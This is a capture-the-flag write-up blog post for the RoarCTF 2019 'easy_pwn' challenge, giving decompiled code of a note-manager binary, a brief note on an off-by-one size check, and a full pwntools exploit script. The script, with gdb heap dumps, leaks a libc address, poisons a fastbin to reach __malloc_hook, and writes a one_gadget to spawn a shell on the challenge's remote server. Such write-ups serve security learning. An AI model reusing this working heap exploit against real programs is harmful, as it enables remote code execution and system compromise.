---
layout: post
title:  easy_pwn
date:   2021-03-28 00:01:01 +0300
image:  2021-03-28-mouse.jpg
tags:   [ctf,Pwn,roarctf2019,ubuntu16,heap,off-by-one]
---

main

```assembly
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v4; // [rsp+4h] [rbp-Ch]
  __int64 savedregs; // [rsp+10h] [rbp+0h]

  sub_AD0();
  while ( 1 )
  {
    menu();
    v4 = sub_BE0(v4);
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        create();
        break;
      case 2u:
        puts("Tell me the secret about you!!");
        writeNote();
        break;
      case 3u:
        drop();
        break;
      case 4u:
        show();
        break;
      case 5u:
        return 0LL;
      default:
        puts("Wrong try again!!");
        break;
    }
  }
}
```

menu()

```assembly
int sub_B5A()
{
  puts("Note system");
  puts("1. create a note");
  puts("2. write note");
  puts("3. drop the note");
  puts("4. show the note");
  puts("5. exit");
  return printf("choice: ");
}
```

create()

```assembly
__int64 create()
{
  __int64 result; // rax
  int v1; // ST0C_4
  unsigned int i; // [rsp+4h] [rbp-1Ch]
  int v3; // [rsp+8h] [rbp-18h]
  signed int size; // [rsp+8h] [rbp-18h]
  void *v5; // [rsp+10h] [rbp-10h]

  result = 0LL;
  for ( i = 0; (signed int)i <= 15; ++i )
  {
    result = *((unsigned int *)&unk_202040 + 4 * (signed int)i);
    if ( !(_DWORD)result )
    {
      printf("size: ");
      size = sub_BE0(v3);
      if ( size > 0 )
      {
        if ( size > 4096 )
          size = 4096;
        v5 = calloc(size, 1uLL);
        if ( !v5 )
          exit(-1);
        *((_DWORD *)&unk_202040 + 4 * (signed int)i) = 1;
        *((_DWORD *)&unk_202044 + 4 * (signed int)i) = size;
        qword_202048[2 * (signed int)i] = v5;
        v1 = qword_202048[2 * (signed int)i] & 0xFFF;
        printf("the index of ticket is %d \n", i);
      }
      return i;
    }
  }
  return result;
}
```

write()

```assembly
__int64 writeNote()
{
  int v1; // [rsp+Ch] [rbp-14h]
  signed int v2; // [rsp+Ch] [rbp-14h]
  signed int v3; // [rsp+10h] [rbp-10h]
  int v4; // [rsp+14h] [rbp-Ch]

  printf("index: ");
  v2 = sub_BE0(v1);
  v3 = v2;
  if ( v2 >= 0 && v2 <= 15 )
  {
    v2 = *((_DWORD *)&unk_202040 + 4 * v2);
    if ( v2 == 1 )
    {
      printf("size: ");
      v2 = sub_BE0(1);
      v4 = sub_E26(*((_DWORD *)&unk_202044 + 4 * v3), v2);
      if ( v2 > 0 )
      {
        printf("content: ", (unsigned int)v2);
        v2 = sub_D92(qword_202048[2 * v3], v4);
      }
    }
  }
  return (unsigned int)v2;
}
```

sub_E26()

```assembly
__int64 __fastcall sub_E26(signed int a1, unsigned int a2)
{
  __int64 result; // rax

  if ( a1 > (signed int)a2 )
    return a2;
  if ( a2 - a1 == 10 )
    LODWORD(result) = a1 + 1;
  else
    LODWORD(result) = a1;
  return (unsigned int)result;
}
```

如果修改的大小比原来的大小大10，则可以多输入一个字节。因此存在off-by-one漏洞，可以通过该漏洞来修改其他块的头部，从而欺骗chunk的大小。

drop()

```assembly
__int64 drop()
{
  int v0; // eax
  int v2; // [rsp+Ch] [rbp-14h]
  int v3; // [rsp+10h] [rbp-10h]
  __int64 v4; // [rsp+10h] [rbp-10h]

  printf("index: ");
  v0 = sub_BE0(v3);
  v4 = v0;
  v2 = v0;
  if ( v0 >= 0LL && v0 <= 15LL )
  {
    v4 = *((signed int *)&unk_202040 + 4 * v0);
    if ( v4 == 1 )
    {
      *((_DWORD *)&unk_202040 + 4 * v0) = 0;
      *((_DWORD *)&unk_202044 + 4 * v0) = 0;
      free((void *)qword_202048[2 * v0]);
      qword_202048[2 * v2] = 0LL;
    }
  }
  return v4;
}
```

show()

```assembly
__int64 show()
{
  int v1; // [rsp+0h] [rbp-10h]
  __int64 v2; // [rsp+0h] [rbp-10h]

  printf("index: ");
  LODWORD(v2) = sub_BE0(v1);
  HIDWORD(v2) = v2;
  if ( (signed int)v2 >= 0 && (signed int)v2 <= 15 )
  {
    LODWORD(v2) = *((_DWORD *)&unk_202040 + 4 * (signed int)v2);
    if ( (_DWORD)v2 == 1 )
    {
      printf("content: ", v2);
      LODWORD(v2) = sub_108E(qword_202048[2 * SHIDWORD(v2)], *((unsigned int *)&unk_202044 + 4 * SHIDWORD(v2)));
    }
  }
  return (unsigned int)v2;
}
```

exp

```assembly
from pwn import *

context.log_level = "debug"

libc = ELF("./libc-2.23.so")

# io = process("./roarctf_2019_easy_pwn")
io = remote("node3.buuoj.cn", 27650)

def create(size):
    io.recvuntil("choice: ")
    io.sendline(str(1))
    io.recvuntil("size: ")
    io.sendline(str(size))

def write(index, size, content):
    io.recvuntil("choice: ")
    io.sendline(str(2))
    io.recvuntil("index:")
    io.sendline(str(index))
    io.recvuntil("size: ")
    io.sendline(str(size))
    io.recvuntil("content: ")
    io.send(content)

def drop(index):
    io.recvuntil("choice: ")
    io.sendline(str(3))
    io.recvuntil("index: ")
    io.sendline(str(index))

def show(index):
    io.recvuntil("choice: ")
    io.sendline(str(4))
    io.recvuntil("index: ")
    io.sendline(str(index))

create(0x18)
create(0x18)
create(0x88)
create(0x88)
create(0x28)  # 4
create(0x28)
create(0x68)
'''
0x55f0260ab000:	0x0000000000000000	0x0000000000000021
0x55f0260ab010:	0x0000000000000000	0x0000000000000000
0x55f0260ab020:	0x0000000000000000	0x0000000000000021
0x55f0260ab030:	0x0000000000000000	0x0000000000000000
0x55f0260ab040:	0x0000000000000000	0x0000000000000091
0x55f0260ab050:	0x0000000000000000	0x0000000000000000
0x55f0260ab060:	0x0000000000000000	0x0000000000000000
0x55f0260ab070:	0x0000000000000000	0x0000000000000000
0x55f0260ab080:	0x0000000000000000	0x0000000000000000
0x55f0260ab090:	0x0000000000000000	0x0000000000000000
0x55f0260ab0a0:	0x0000000000000000	0x0000000000000000
0x55f0260ab0b0:	0x0000000000000000	0x0000000000000000
0x55f0260ab0c0:	0x0000000000000000	0x0000000000000000
0x55f0260ab0d0:	0x0000000000000000	0x0000000000000091
0x55f0260ab0e0:	0x0000000000000000	0x0000000000000000
0x55f0260ab0f0:	0x0000000000000000	0x0000000000000000
0x55f0260ab100:	0x0000000000000000	0x0000000000000000
0x55f0260ab110:	0x0000000000000000	0x0000000000000000
0x55f0260ab120:	0x0000000000000000	0x0000000000000000
0x55f0260ab130:	0x0000000000000000	0x0000000000000000
0x55f0260ab140:	0x0000000000000000	0x0000000000000000
0x55f0260ab150:	0x0000000000000000	0x0000000000000000
0x55f0260ab160:	0x0000000000000000	0x0000000000000031
0x55f0260ab170:	0x0000000000000000	0x0000000000000000
0x55f0260ab180:	0x0000000000000000	0x0000000000000000
0x55f0260ab190:	0x0000000000000000	0x0000000000000031
0x55f0260ab1a0:	0x0000000000000000	0x0000000000000000
0x55f0260ab1b0:	0x0000000000000000	0x0000000000000000
0x55f0260ab1c0:	0x0000000000000000	0x0000000000000071
0x55f0260ab1d0:	0x0000000000000000	0x0000000000000000
0x55f0260ab1e0:	0x0000000000000000	0x0000000000000000
0x55f0260ab1f0:	0x0000000000000000	0x0000000000000000
0x55f0260ab200:	0x0000000000000000	0x0000000000000000
0x55f0260ab210:	0x0000000000000000	0x0000000000000000
0x55f0260ab220:	0x0000000000000000	0x0000000000000000
'''

write(0, 34, "a"*0x18 + p8(0xb1))
'''
0x557d15068000:	0x0000000000000000	0x0000000000000021
0x557d15068010:	0x6161616161616161	0x6161616161616161
0x557d15068020:	0x6161616161616161	0x00000000000000b1 1
0x557d15068030:	0x0000000000000000	0x0000000000000000
0x557d15068040:	0x0000000000000000	0x0000000000000091 2
0x557d15068050:	0x0000000000000000	0x0000000000000000
0x557d15068060:	0x0000000000000000	0x0000000000000000
0x557d15068070:	0x0000000000000000	0x0000000000000000
0x557d15068080:	0x0000000000000000	0x0000000000000000
0x557d15068090:	0x0000000000000000	0x0000000000000000
0x557d150680a0:	0x0000000000000000	0x0000000000000000
0x557d150680b0:	0x0000000000000000	0x0000000000000000
0x557d150680c0:	0x0000000000000000	0x0000000000000000
0x557d150680d0:	0x0000000000000000	0x0000000000000091 3
0x557d150680e0:	0x0000000000000000	0x0000000000000000
0x557d150680f0:	0x0000000000000000	0x0000000000000000
0x557d15068100:	0x0000000000000000	0x0000000000000000
0x557d15068110:	0x0000000000000000	0x0000000000000000
0x557d15068120:	0x0000000000000000	0x0000000000000000
0x557d15068130:	0x0000000000000000	0x0000000000000000
0x557d15068140:	0x0000000000000000	0x0000000000000000
0x557d15068150:	0x0000000000000000	0x0000000000000000
0x557d15068160:	0x0000000000000000	0x0000000000000031 4
0x557d15068170:	0x0000000000000000	0x0000000000000000
0x557d15068180:	0x0000000000000000	0x0000000000000000
0x557d15068190:	0x0000000000000000	0x0000000000000031 5
0x557d150681a0:	0x0000000000000000	0x0000000000000000
0x557d150681b0:	0x0000000000000000	0x0000000000000000
0x557d150681c0:	0x0000000000000000	0x0000000000000071 6
0x557d150681d0:	0x0000000000000000	0x0000000000000000
0x557d150681e0:	0x0000000000000000	0x0000000000000000
0x557d150681f0:	0x0000000000000000	0x0000000000000000
0x557d15068200:	0x0000000000000000	0x0000000000000000
0x557d15068210:	0x0000000000000000	0x0000000000000000
0x557d15068220:	0x0000000000000000	0x0000000000000000
'''

drop(1)
create(0xa8)
write(1, 0x20, "b"*0x18 + p64(0x91))
drop(2)
'''
0x558cde1eb000:	0x0000000000000000	0x0000000000000021
0x558cde1eb010:	0x6161616161616161	0x6161616161616161
0x558cde1eb020:	0x6161616161616161	0x00000000000000b1 1
0x558cde1eb030:	0x6262626262626262	0x6262626262626262
0x558cde1eb040:	0x6262626262626262	0x0000000000000091 2
0x558cde1eb050:	0x00007f31cca0fb78	0x00007f31cca0fb78
0x558cde1eb060:	0x0000000000000000	0x0000000000000000
0x558cde1eb070:	0x0000000000000000	0x0000000000000000
0x558cde1eb080:	0x0000000000000000	0x0000000000000000
0x558cde1eb090:	0x0000000000000000	0x0000000000000000
0x558cde1eb0a0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0b0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0c0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0d0:	0x0000000000000090	0x0000000000000090 3
0x558cde1eb0e0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0f0:	0x0000000000000000	0x0000000000000000
0x558cde1eb100:	0x0000000000000000	0x0000000000000000
0x558cde1eb110:	0x0000000000000000	0x0000000000000000
0x558cde1eb120:	0x0000000000000000	0x0000000000000000
0x558cde1eb130:	0x0000000000000000	0x0000000000000000
0x558cde1eb140:	0x0000000000000000	0x0000000000000000
0x558cde1eb150:	0x0000000000000000	0x0000000000000000
0x558cde1eb160:	0x0000000000000000	0x0000000000000031 4
0x558cde1eb170:	0x0000000000000000	0x0000000000000000
0x558cde1eb180:	0x0000000000000000	0x0000000000000000
0x558cde1eb190:	0x0000000000000000	0x0000000000000031 5
0x558cde1eb1a0:	0x0000000000000000	0x0000000000000000
0x558cde1eb1b0:	0x0000000000000000	0x0000000000000000
0x558cde1eb1c0:	0x0000000000000000	0x0000000000000071
0x558cde1eb1d0:	0x0000000000000000	0x0000000000000000
0x558cde1eb1e0:	0x0000000000000000	0x0000000000000000
0x558cde1eb1f0:	0x0000000000000000	0x0000000000000000
0x558cde1eb200:	0x0000000000000000	0x0000000000000000
0x558cde1eb210:	0x0000000000000000	0x0000000000000000
0x558cde1eb220:	0x0000000000000000	0x0000000000000000
'''

show(1)
io.recvuntil("content: ")
io.recv(0x20)
addr = u64(io.recv(0x8))
print(hex(addr))
'''
gdb-peda$ x/50gx 0x00007f2bccd16b00
0x7f2bccd16b00 <__memalign_hook>:	0x00007f2bcc9d7ea0	0x00007f2bcc9d7a70
0x7f2bccd16b10 <__malloc_hook>:	    0x0000000000000000	0x0000000000000000
0x7f2bccd16b20 <main_arena>:	    0x0000000100000000	0x0000000000000000
0x7f2bccd16b30 <main_arena+16>:	    0x0000000000000000	0x0000000000000000
0x7f2bccd16b40 <main_arena+32>:	    0x0000000000000000	0x0000000000000000
0x7f2bccd16b50 <main_arena+48>:	    0x0000000000000000	0x0000000000000000
0x7f2bccd16b60 <main_arena+64>:	    0x0000000000000000	0x0000000000000000
0x7f2bccd16b70 <main_arena+80>:	    0x0000000000000000	0x000055bb331bb230
0x7f2bccd16b80 <main_arena+96>:	    0x0000000000000000	0x000055bb331bb040
'''
'''
./main_arena libc-2.23.so 
[+]libc version : glibc 2.23
[+]build ID : BuildID[sha1]=1ca54a6e0d76188105b12e49fe6b8019bf08803a
[+]main_arena_offset : 0x3c4b20
'''

base = addr - 88 - 0x3c4b20
malloc_hook = base + libc.sym["__malloc_hook"]
realloc = base + libc.sym["__libc_realloc"]
one_gadget = base + 0x4526a
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

write(4, 50, "c"*0x28 + p8(0xa1))
'''
0x558cde1eb000:	0x0000000000000000	0x0000000000000021
0x558cde1eb010:	0x6161616161616161	0x6161616161616161
0x558cde1eb020:	0x6161616161616161	0x00000000000000b1 1
0x558cde1eb030:	0x6262626262626262	0x6262626262626262
0x558cde1eb040:	0x6262626262626262	0x0000000000000091 2
0x558cde1eb050:	0x00007f31cca0fb78	0x00007f31cca0fb78
0x558cde1eb060:	0x0000000000000000	0x0000000000000000
0x558cde1eb070:	0x0000000000000000	0x0000000000000000
0x558cde1eb080:	0x0000000000000000	0x0000000000000000
0x558cde1eb090:	0x0000000000000000	0x0000000000000000
0x558cde1eb0a0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0b0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0c0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0d0:	0x0000000000000090	0x0000000000000090 3
0x558cde1eb0e0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0f0:	0x0000000000000000	0x0000000000000000
0x558cde1eb100:	0x0000000000000000	0x0000000000000000
0x558cde1eb110:	0x0000000000000000	0x0000000000000000
0x558cde1eb120:	0x0000000000000000	0x0000000000000000
0x558cde1eb130:	0x0000000000000000	0x0000000000000000
0x558cde1eb140:	0x0000000000000000	0x0000000000000000
0x558cde1eb150:	0x0000000000000000	0x0000000000000000
0x558cde1eb160:	0x0000000000000000	0x0000000000000031 4
0x558cde1eb170:	0x6363636363636363	0x6363636363636363
0x558cde1eb180:	0x6363636363636363	0x6363636363636363
0x558cde1eb190:	0x6363636363636363	0x00000000000000a1 5
0x558cde1eb1a0:	0x0000000000000000	0x0000000000000000
0x558cde1eb1b0:	0x0000000000000000	0x0000000000000000
0x558cde1eb1c0:	0x0000000000000000	0x0000000000000071
0x558cde1eb1d0:	0x0000000000000000	0x0000000000000000
0x558cde1eb1e0:	0x0000000000000000	0x0000000000000000
0x558cde1eb1f0:	0x0000000000000000	0x0000000000000000
0x558cde1eb200:	0x0000000000000000	0x0000000000000000
0x558cde1eb210:	0x0000000000000000	0x0000000000000000
0x558cde1eb220:	0x0000000000000000	0x0000000000000000
'''

drop(5)
drop(6)
create(0x98)  # 2
'''
0x558cde1eb000:	0x0000000000000000	0x0000000000000021
0x558cde1eb010:	0x6161616161616161	0x6161616161616161
0x558cde1eb020:	0x6161616161616161	0x00000000000000b1 1
0x558cde1eb030:	0x6262626262626262	0x6262626262626262
0x558cde1eb040:	0x6262626262626262	0x0000000000000091 2
0x558cde1eb050:	0x00007f31cca0fb78	0x00007f31cca0fb78
0x558cde1eb060:	0x0000000000000000	0x0000000000000000
0x558cde1eb070:	0x0000000000000000	0x0000000000000000
0x558cde1eb080:	0x0000000000000000	0x0000000000000000
0x558cde1eb090:	0x0000000000000000	0x0000000000000000
0x558cde1eb0a0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0b0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0c0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0d0:	0x0000000000000090	0x0000000000000090 3
0x558cde1eb0e0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0f0:	0x0000000000000000	0x0000000000000000
0x558cde1eb100:	0x0000000000000000	0x0000000000000000
0x558cde1eb110:	0x0000000000000000	0x0000000000000000
0x558cde1eb120:	0x0000000000000000	0x0000000000000000
0x558cde1eb130:	0x0000000000000000	0x0000000000000000
0x558cde1eb140:	0x0000000000000000	0x0000000000000000
0x558cde1eb150:	0x0000000000000000	0x0000000000000000
0x558cde1eb160:	0x0000000000000000	0x0000000000000031 4
0x558cde1eb170:	0x6363636363636363	0x6363636363636363
0x558cde1eb180:	0x6363636363636363	0x6363636363636363
0x558cde1eb190:	0x6363636363636363	0x00000000000000a1 5/2
0x558cde1eb1a0:	0x0000000000000000	0x0000000000000000
0x558cde1eb1b0:	0x0000000000000000	0x0000000000000000
0x558cde1eb1c0:	0x0000000000000000	0x0000000000000071 6
0x558cde1eb1d0:	0x0000000000000000	0x0000000000000000
0x558cde1eb1e0:	0x0000000000000000	0x0000000000000000
0x558cde1eb1f0:	0x0000000000000000	0x0000000000000000
0x558cde1eb200:	0x0000000000000000	0x0000000000000000
0x558cde1eb210:	0x0000000000000000	0x0000000000000000
0x558cde1eb220:	0x0000000000000000	0x0000000000000000
'''
write(2,0x38, "d"*0x28 + p64(0x71) + p64(malloc_hook - 0x23))
'''
0x558cde1eb000:	0x0000000000000000	0x0000000000000021
0x558cde1eb010:	0x6161616161616161	0x6161616161616161
0x558cde1eb020:	0x6161616161616161	0x00000000000000b1 1
0x558cde1eb030:	0x6262626262626262	0x6262626262626262
0x558cde1eb040:	0x6262626262626262	0x0000000000000091 2
0x558cde1eb050:	0x00007f31cca0fb78	0x00007f31cca0fb78
0x558cde1eb060:	0x0000000000000000	0x0000000000000000
0x558cde1eb070:	0x0000000000000000	0x0000000000000000
0x558cde1eb080:	0x0000000000000000	0x0000000000000000
0x558cde1eb090:	0x0000000000000000	0x0000000000000000
0x558cde1eb0a0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0b0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0c0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0d0:	0x0000000000000090	0x0000000000000090 3
0x558cde1eb0e0:	0x0000000000000000	0x0000000000000000
0x558cde1eb0f0:	0x0000000000000000	0x0000000000000000
0x558cde1eb100:	0x0000000000000000	0x0000000000000000
0x558cde1eb110:	0x0000000000000000	0x0000000000000000
0x558cde1eb120:	0x0000000000000000	0x0000000000000000
0x558cde1eb130:	0x0000000000000000	0x0000000000000000
0x558cde1eb140:	0x0000000000000000	0x0000000000000000
0x558cde1eb150:	0x0000000000000000	0x0000000000000000
0x558cde1eb160:	0x0000000000000000	0x0000000000000031 4
0x558cde1eb170:	0x6363636363636363	0x6363636363636363
0x558cde1eb180:	0x6363636363636363	0x6363636363636363
0x558cde1eb190:	0x6363636363636363	0x00000000000000a1 5/2
0x558cde1eb1a0:	0x6464646464646464	0x6464646464646464
0x558cde1eb1b0:	0x6464646464646464	0x6464646464646464
0x558cde1eb1c0:	0x6464646464646464	0x0000000000000071 6
0x558cde1eb1d0:	0xmalloc_hook-0x23	0x0000000000000000
0x558cde1eb1e0:	0x0000000000000000	0x0000000000000000
0x558cde1eb1f0:	0x0000000000000000	0x0000000000000000
0x558cde1eb200:	0x0000000000000000	0x0000000000000000
0x558cde1eb210:	0x0000000000000000	0x0000000000000000
0x558cde1eb220:	0x0000000000000000	0x0000000000000000
'''
'''
0x7eff90d2eaed <_IO_wide_data_0+301>:	0xff90d2d260000000	0x000000000000007e
0x7eff90d2eafd:	0xff909efea0000000	0xff909efa7000007e
0x7eff90d2eb0d <__realloc_hook+5>:	0x000000000000007e	0x0000000000000000
0x7eff90d2eb1d:	0x0000000000000000	0x0000000000000000
0x7eff90d2eb2d <main_arena+13>:	0x0000000000000000	0x0000000000000000
0x7eff90d2eb3d <main_arena+29>:	0x0000000000000000	0x0000000000000000
0x7eff90d2eb4d <main_arena+45>:	0x11779af1c0000000	0x0000000000000056
'''
create(0x68)  # 5
'''
gdb-peda$ x/50gx 0x00007f87e4e94b00 - 0x13 - 0x8
0x7f87e4e94ae5 <_IO_wide_data_0+293>:	0x0000000000000000	0x87e4e93260000000
0x7f87e4e94af5 <_IO_wide_data_0+309>:	0x000000000000007f	0x87e4b55ea0000000
0x7f87e4e94b05 <__memalign_hook+5>:	0x87e4b55a7000007f	0x000000000000007f
0x7f87e4e94b15 <__malloc_hook+5>:	0x0000000000000000	0x0000000000000000
0x7f87e4e94b25 <main_arena+5>:	0x0000000000000000	0x0000000000000000
0x7f87e4e94b35 <main_arena+21>:	0x0000000000000000	0x0000000000000000
0x7f87e4e94b45 <main_arena+37>:	0x0000000000000000	0x87e4e94aed000000
0x7f87e4e94b55 <main_arena+53>:	0x000000000000007f	0x0000000000000000
0x7f87e4e94b65 <main_arena+69>:	0x0000000000000000	0x0000000000000000
0x7f87e4e94b75 <main_arena+85>:	0x00dd633230000000	0x0000000000000056
0x7f87e4e94b85 <main_arena+101>:	0x87e4e94b78000000	0x87e4e94b7800007f
0x7f87e4e94b95 <main_arena+117>:	0x87e4e94b8800007f	0x87e4e94b8800007f
0x7f87e4e94ba5 <main_arena+133>:	0x87e4e94b9800007f	0x87e4e94b9800007f
0x7f87e4e94bb5 <main_arena+149>:	0x87e4e94ba800007f	0x87e4e94ba800007f
'''

create(0x68)   # 6
'''
gdb-peda$ x/50gx 0x00007f9fe70e9b00 - 0x13 - 0x8
0x7f9fe70e9ae5 <_IO_wide_data_0+293>:	0x0000000000000000	0x9fe70e8260000000
0x7f9fe70e9af5 <_IO_wide_data_0+309>:	0x000000000000007f	0x9fe6daaea0000000
0x7f9fe70e9b05 <__memalign_hook+5>:	0x9fe6daaa7000007f	0x000000000000007f
0x7f9fe70e9b15 <__malloc_hook+5>:	0x0000000000000000	0x0000000000000000
0x7f9fe70e9b25 <main_arena+5>:	0x0000000000000000	0x0000000000000000
0x7f9fe70e9b35 <main_arena+21>:	0x0000000000000000	0x0000000000000000
0x7f9fe70e9b45 <main_arena+37>:	0x0000000000000000	0xaea0000000000000
0x7f9fe70e9b55 <main_arena+53>:	0x00000000009fe6da	0x0000000000000000  #
0x7f9fe70e9b65 <main_arena+69>:	0x0000000000000000	0x0000000000000000
0x7f9fe70e9b75 <main_arena+85>:	0xc6624b9230000000	0x0000000000000055
0x7f9fe70e9b85 <main_arena+101>:	0x9fe70e9b78000000	0x9fe70e9b7800007f
0x7f9fe70e9b95 <main_arena+117>:	0x9fe70e9b8800007f	0x9fe70e9b8800007f
0x7f9fe70e9ba5 <main_arena+133>:	0x9fe70e9b9800007f	0x9fe70e9b9800007f
0x7f9fe70e9bb5 <main_arena+149>:	0x9fe70e9ba800007f	0x9fe70e9ba800007f
'''
write(6, 27, "e"*(0x13 - 8) + p64(one_gadget) + p64(realloc + 16))
'''
gdb-peda$ x/50gx 0x00007f9fe70e9b10 - 0x23
0x7f9fe70e9aed <_IO_wide_data_0+301>:	0x9fe70e8260000000	0x000000000000007f
0x7f9fe70e9afd:	0x9fe6daaea0000000	0x9fe6daaa7000007f
0x7f9fe70e9b0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
0x7f9fe70e9b1d:	0x0000000000000000	0x0000000000000000
'''
'''
gdb-peda$ x/50gx 0x00007f9fe70e9b10 - 0x23 - 5
0x7f9fe70e9ae8 <_IO_wide_data_0+296>:	0x0000000000000000	0x00007f9fe70e8260
0x7f9fe70e9af8:	0x0000000000000000	0x00007f9fe6daaea0
0x7f9fe70e9b08 <__realloc_hook>:	0x00007f9fe6daaa70	0x0000000000000000
0x7f9fe70e9b18:	0x0000000000000000	0x0000000000000000
0x7f9fe70e9b28 <main_arena+8>:	0x0000000000000000	0x0000000000000000
'''
io.recvuntil("choice: ")
io.sendline(str(1))

# gdb.attach(io)
# raw_input()

io.interactive()
```

